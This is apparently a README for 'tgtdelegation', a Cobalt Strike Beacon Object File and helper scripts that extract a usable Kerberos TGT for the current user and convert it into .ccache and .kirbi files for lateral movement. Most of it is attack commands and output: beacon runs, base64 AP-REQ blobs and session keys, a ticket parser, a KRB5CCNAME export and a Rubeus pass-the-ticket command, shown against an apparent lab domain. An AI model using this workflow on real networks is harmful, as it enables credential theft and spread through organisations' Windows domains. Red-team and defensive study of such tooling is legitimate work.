# tgtdelegation
```
  __          __      .___     .__                       __  .__               
_/  |_  _____/  |_  __| _/____ |  |   ____   _________ _/  |_|__| ____   ____  
\   __\/ ___\   __\/ __ |/ __ \|  | _/ __ \ / ___\__  \\   __\  |/  _ \ /    \ 
 |  | / /_/  >  | / /_/ \  ___/|  |_\  ___// /_/  > __ \|  | |  (  <_> )   |  \
 |__| \___  /|__| \____ |\___  >____/\___  >___  (____  /__| |__|\____/|___|  /
     /_____/           \/    \/          \/_____/     \/                    \/       
```

Beacon Object File (BOF) to obtain a usable TGT for the current user. This data blob is passed to `tgtParse.py`/`tgtParse.exe` ("custom" Impacket scripts to decrypt/parse the Kerberos data blobs) and `ticketConverter.py`/`ticketConverter.exe` automatically, via `tgtdelegation.cna`, to be leveraged as a usable `.ccache` and/or `.kirbi` for lateral movement with Impacket, Rubeus, and other supported tools over Kerberos. If you would like to specify a domain, you may specify it. If you would prefer to just use your current domain, specify the `currentdomain` option, which queries the environmental variable `USERDNSDOMAIN` and passes it to `tgtdelegation`. Additionally, you may specify a SPN or use a default SPN for `CIFS/PDC.DOMAIN.LOCAL`. This SPN argument is available in case the default SPN is not configured for unconstrained delegation. To use all defaults, the following command is used: `tgtdelegation currentdomain default`. To specify a domain/SPN, the following command could be used: `tgtdelegation MARVEL.LOCAL CIFS/Earth-DC.marvel.local`. The target SPN needs to be configured with unconstrained delegation if you decide to specify a SPN. This is because the `tgtdeleg` trick doesn't just "request a TGT", but instead it prepares a TGT to be sent to the "fake target (e.g. the target SPN)". From here, the TGT is extracted from the Windows API call to `InitializeSecurityContext`. This is why the target is required to be configured with unconstrained delegation.

## Requirements
`tgtdelegation` requires `python3.9`. If you are using a "semi-recent" Kali Linux build, `python3.9` should already be installed. Verify this by entering the command `python3.9 -V`. 

In the event you do _not_ have `python3.9` installed, a script has been included named `install_python_39.sh`. **PLEASE RUN THIS SCRIPT AFTER CLONING THE REPOSITORY IF YOU DO NOT HAVE `python3.9` INSTALLED!**

The provided `tgtdelegation.cna` Aggressor Script, which automated the Kerberos parsing/decryption, calls the `python3.9` binary directly and _does not_ call `python3`. This is because the `install_python_39.sh` script does not change the "default" version of Python and instead installs `python3.9` alongside other versions of Python.

## Usage
(Optional) Run `tgtdelegation/install_python_39.sh` as a sudo user or `root` (if `python3.9` is not already installed)

1. Open `Script Console` in Cobalt Strike and enter the following command: `load /path/to/tgtdelegation/tgtdelegation.cna`
2. `tgtdelegation [FQDN/currentdomain SPN/default]`
```
beacon> tgtdelegation currentdomain default
[+] host called home, sent: 9086 bytes
[+] received output:
[+] No domain specified! Using the USERDNSDOMAIN environmental variable...

[+] received output:
[+] Found a DC for the domain MARVEL.LOCAL!
[+] DC: \\Earth-DC.marvel.local

[+] received output:
[+] No SPN specified! Using default SPN...

[+] received output:
[+] Target SPN: CIFS/Earth-DC.marvel.local

[+] received output:
[+] Successfully obtained a handle to the current credentials set!

[+] received output:
[+] Successfully initialized the Kerberos GSS-API!

[+] received output:
[+] The delegation request was successful! AP-REQ ticket is now in the GSS-API output.

[+] received output:
[+] Successfully invoked LsaCallAuthenticationPackage! The Kerberos session key should be cached!

[+] received output:
[+] Job nonce: 547694409

[+] AP-REQ output:
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

[+] Kerberos session key:
Fs9hEJf95q0WfVrXmJ6qs5czYfB0jajuKIHJuGom9mA=

[+] Encryption:
AES256

[+] received output:
[+] tgtdelegation succeeded!

[+] Invoking tgtParse.py to obtain a usable .ccache!

[+] Successfully decrypted the AP-REQ response!

[+] Local path to usable .ccache: /Users/cmcgarr/loki@MARVEL.LOCAL.ccache
[+] Local path to usable .kirbi: /Users/cmcgarr/loki@MARVEL.LOCAL.kirbi
[+] Base64 encoded .kirbi:
doIFAjCCBP6gAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMTUFSVkVMLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA63pQaeWp0BYSHO2JrNTouHkOJIO44Kl+G0dQwgo9hCVtn+rz+gHNq52RXRn+5/K82gL3GUUJUpOs8krUx+lyd1s9Ys0o8ECMEvdhGbmeGOd/2hnTIpdhZg+4gwP8iX+wMi7cAxJjmS9BpJ3s7TMimfov9TOKQ+8Uh7eFEZY7X/jTBEpr3Q7ZsQqwwk7z0IpHSRk6ZvKoWdsET1p/fnp/RqU05h5Qv7l1plj5nT7wELRtyYMCGDQGII6nvY+OyJGo1zGe8wQX/g/2ckcSP1G9MPjP4z4zPFKba2uDoKq1zO/+F1eRB43WfpAil6FkK0WDnFDGsrUjJ7CztKPocwj6NtBf2Fppf4Wz3Mur5wyD7UXv5qafr6EToQLSqsbspAzx1wiJLzbiWf6JuRWyeWv2K3ceZjv8kV7lP0grMmHNm5SCBE7Y2NoEOgmmWTpmOnd/iHlXGVXXJFR0g9fNXait2DQT67tTiD020BHjU/iheeh4H7dtzG9KfXC3KjnuWW+aTKnzt+KJKC455LVbqXlY83hVjtxyBU9qpepKHO+1ttv6SkFV40aa0eEZSncxM/W/S0Dh43DvGENAGDEQXA6QaELg4cJsNk1mMBfABfczslbR4y++npSAtCvwz9swN6VsYKtIT46hrR0NZAMJeWSHGf3UhhCamMjJTNHqceR35Rh/NqYWShkYD6XpqC5WvE6Kuy6+PpwlL+OZDziBtDDEBiN0FbgQWEzmd/e/D2aPbW8LwcFjRvemzN3gfg3IdaT85yvlX6CcvOSUa2033c7Pa0WWbgCZ9vVTSFIhrhBfD739VmQMcQLN9gYQp36qlS49CXVaymg/UNRkiiUoNsk/BG79UUw5JKzms2eTRy0KA0OqAaNbfBYDwCGB31g0Gvl3APKQk3iYdKoPXDeRAfzriHEFeWjRsjiu6qp8Ngk43aputpoy286JcOYfgKW0gCl5R2ndOSEJ71ovW5agn7uAKO3XL1FLWEkRL6oEZsxHe4IjBer45c5Nzj9YDA8SxfxJ3/EVxY+FhjFe3GIj4aZ6hWIAkt5pcbof6nw7VE22XdjPNBjdd6Ls+kUVNZ71PHPFQbHE4KV0O4hh30TK22G5vWPY6WfhE7BYMLlIhSJdkRQd7RSNd2EkofKdnk3p3HHQhbxsPznZI0TEHcYQaOa52g7XQ3Ze1pqm4/xKZ0XRl0pFFpiHVqOi/Y3R4VKmbOpaHBV+9+o+6FKnR+tL9i1rbH36aFiGT8rU5Vy1oXDc6OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIJlE0VczZlis4ESzXaGTQN/T8gBzL7NumKBiN2wgBuHvoQ4bDE1BUlZFTC5MT0NBTKIRMA+gAwIBAaEIMAYbBGxva2mjBwMFAcFCAAClERgPMjAyMTA2MjUxNTE3MDJaphEYDzIwMjEwNjI1MjExMTU1WqcRGA8yMDIxMDcwMTE1NTUxNFqoDhsMTUFSVkVMLkxPQ0FMqSEwH6ADAgECoRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=
```

When `tgtdelegation` is invoked, the tgtdelegation CNA script will automatically invoke `tgtParse.py` or `tgtParse.exe`/`ticketConverter.py` or `ticketConverter.exe`, which are ASN1 parsers/AP-REQ decrypters and ticket converters that can output a usable `.ccache` or `.kirbi` for Kerberos lateral movement. `tgtParse.py`, `tgtParse.exe`, `ticketConverter.py`, and `ticketConverter.exe` can be found in `tgtdelegation/tgtParse`. The `tgtdelegation.cna` will automatically invoke a command in order to determine if a Mac OS, Linux, or Windows Cobalt Strike client is in use, and will invoke the appropriate parser/decrypter and converter. `tgtParse.exe` and `ticketConverter.exe` are `PyInstaller` standalone `.exe` binaries that will perform the identical actions of `tgtParse.py` and `ticketConverter.py`. Upon completion, operators need only specify the full path to the `.ccache` file, outputted from `tgtdelegation`, as the `KRB5CCNAME` environmental variable to use Kerberos authentication in an off-host/SOCKS proxy manner with Impacket:

```
export KRB5CCNAME=/path/to/loki@MARVEL.LOCAL.ccache
```
```
export KRB5CCNAME=/path/to/loki@MARVEL.LOCAL.ccache
```

This `.ccache` can also be applied directly to a Beacon as well, with the following command:

```
kerberos_ccache_use /path/to/.ccache_from_tgtdelegation
```

`tgtdelegation` will also output a Base64 encoded `.kirbi` file, as well as dropping the `.kirbi` to the same path as the previous `.ccache`. This Base64 blob can be leveraged with `Rubeus.exe` to pass the ticket as such:

`Rubeus.exe ptt /ticket:base_64_kirbi_blob_from_tgtdelegation`

If you would prefer to parse and decrypt the AP-REQ manually, leverage the following command, by manually supplying the Base64 encoded AP-REQ response, Base64 encoded Kerberos session key, and the encryption type with either `tgtParse.py`/`tgtParse.exe`:

```
python3.9 tgtParse.py --apreq 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 --sessionkey oDv9x4eheTTUnSNtT7hqgNpysbfL5rlXOr88KM9163o= --etype AES256
[+] Identified ticket for loki@MARVEL.LOCAL
[+] Successfully extracted the TGT! Saved as: loki@MARVEL.LOCAL.ccache!
Local path to usable .ccache: /root/loki@MARVEL.LOCAL.ccache
```

From here, you do not need to do any more converting, etc. - you now have a usable `.ccache`. The next step is to set the `KRB5CCNAME` environmental variable, on the machine you intend to use this `.ccache` file with:

```
export KRB5CCNAME=/path/to/loki@MARVEL.LOCAL.ccache
```

It is also possible to manually invoke `tickerConverter.py`/`tickerConverter.exe` to convert the `.ccache` into a `.kirbi` and also a Base64 encoded `.kirbi`.

```
python3.9 ticketConverter.py /path/to/file.ccache /path/to/output/file.kirbi                                      ─╯
[*] converting ccache to kirbi...
Local path to usable .kirbi: /path/to/output/file.kirbi
doIFAjCCBP6gAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMTUFSVkVMLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA63pQaeWp0BYSHO2JrNTouHkOJIO44Kl+G0dQwgo9hCVtn+rz+gHNq52RXRn+5/K82gL3GUUJUpOs8krUx+lyd1s9Ys0o8ECMEvdhGbmeGOd/2hnTIpdhZg+4gwP8iX+wMi7cAxJjmS9BpJ3s7TMimfov9TOKQ+8Uh7eFEZY7X/jTBEpr3Q7ZsQqwwk7z0IpHSRk6ZvKoWdsET1p/fnp/RqU05h5Qv7l1plj5nT7wELRtyYMCGDQGII6nvY+OyJGo1zGe8wQX/g/2ckcSP1G9MPjP4z4zPFKba2uDoKq1zO/+F1eRB43WfpAil6FkK0WDnFDGsrUjJ7CztKPocwj6NtBf2Fppf4Wz3Mur5wyD7UXv5qafr6EToQLSqsbspAzx1wiJLzbiWf6JuRWyeWv2K3ceZjv8kV7lP0grMmHNm5SCBE7Y2NoEOgmmWTpmOnd/iHlXGVXXJFR0g9fNXait2DQT67tTiD020BHjU/iheeh4H7dtzG9KfXC3KjnuWW+aTKnzt+KJKC455LVbqXlY83hVjtxyBU9qpepKHO+1ttv6SkFV40aa0eEZSncxM/W/S0Dh43DvGENAGDEQXA6QaELg4cJsNk1mMBfABfczslbR4y++npSAtCvwz9swN6VsYKtIT46hrR0NZAMJeWSHGf3UhhCamMjJTNHqceR35Rh/NqYWShkYD6XpqC5WvE6Kuy6+PpwlL+OZDziBtDDEBiN0FbgQWEzmd/e/D2aPbW8LwcFjRvemzN3gfg3IdaT85yvlX6CcvOSUa2033c7Pa0WWbgCZ9vVTSFIhrhBfD739VmQMcQLN9gYQp36qlS49CXVaymg/UNRkiiUoNsk/BG79UUw5JKzms2eTRy0KA0OqAaNbfBYDwCGB31g0Gvl3APKQk3iYdKoPXDeRAfzriHEFeWjRsjiu6qp8Ngk43aputpoy286JcOYfgKW0gCl5R2ndOSEJ71ovW5agn7uAKO3XL1FLWEkRL6oEZsxHe4IjBer45c5Nzj9YDA8SxfxJ3/EVxY+FhjFe3GIj4aZ6hWIAkt5pcbof6nw7VE22XdjPNBjdd6Ls+kUVNZ71PHPFQbHE4KV0O4hh30TK22G5vWPY6WfhE7BYMLlIhSJdkRQd7RSNd2EkofKdnk3p3HHQhbxsPznZI0TEHcYQaOa52g7XQ3Ze1pqm4/xKZ0XRl0pFFpiHVqOi/Y3R4VKmbOpaHBV+9+o+6FKnR+tL9i1rbH36aFiGT8rU5Vy1oXDc6OB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIJlE0VczZlis4ESzXaGTQN/T8gBzL7NumKBiN2wgBuHvoQ4bDE1BUlZFTC5MT0NBTKIRMA+gAwIBAaEIMAYbBGxva2mjBwMFAcFCAAClERgPMjAyMTA2MjUxNTE3MDJaphEYDzIwMjEwNjI1MjExMTU1WqcRGA8yMDIxMDcwMTE1NTUxNFqoDhsMTUFSVkVMLkxPQ0FMqSEwH6ADAgECoRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=
[+] done
```

## A Word On ASN1
Please note that `tgtdelegation`, since Beacon Object Files cannot link to external libs like the ASN1 libs, will essentially perform "trial-by-error" to determine the encryption type. First AES256 is used. In my experiences, 99.9% of the time I have seen this to be the encryption type in use. If this fails, AES128 is tried. If this fails RC4 is used. Instead of being able to parse the AP-REQ blob to determine the encryption size, we do "trial-by-error" to identify the encryption type.

This is also why there is a need to pass the AP-REQ blob and Kerberos session key to the "custom" Impacket scripts, as `tgtdelegation` cannot use the same libraries as Kekeo and/or Rubeus to decrypt/parse the Kerberos blobs/structures. This is all automated via Aggressor in Cobalt Strike

## Credits
[Will Schroeder](https://twitter.com/harmj0y) for [Rubeus code examples](https://github.com/GhostPack/Rubeus)

[Benjamin Deply](https://twitter.com/gentilkiwi) for [Kekeo code examples](https://github.com/gentilkiwi/kekeo/)

[SecureAuthCorp](https://twitter.com/_dirkjan) for [Impacket libraries](https://github.com/SecureAuthCorp/impacket)
